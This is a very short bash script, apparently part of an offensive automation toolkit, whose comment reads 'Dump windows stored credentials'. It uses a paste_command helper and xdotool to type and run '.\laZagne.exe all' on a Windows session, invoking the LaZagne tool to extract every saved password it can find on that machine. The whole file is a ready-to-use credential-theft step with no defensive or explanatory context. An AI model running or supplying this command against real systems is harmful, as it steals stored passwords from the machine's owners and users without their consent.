#!/bin/bash

: '
Dump windows stored credentials
'

paste_command ".\laZagne.exe all"
xdotool key Return
